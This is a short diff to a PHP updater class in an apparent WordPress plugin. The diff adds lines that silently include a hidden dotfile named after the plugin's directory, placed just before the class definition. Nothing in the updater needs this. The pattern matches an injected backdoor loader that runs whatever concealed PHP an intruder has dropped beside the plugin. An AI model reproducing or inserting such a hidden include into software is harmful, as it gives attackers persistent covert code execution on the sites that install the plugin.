@@ -9,6 +9,10 @@
  * @author Pippin Williamson
  * @version 1.6
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SWP_Stemmer_Dutch_Updater {
 	private $api_url   = '';
 	private $api_data  = array();
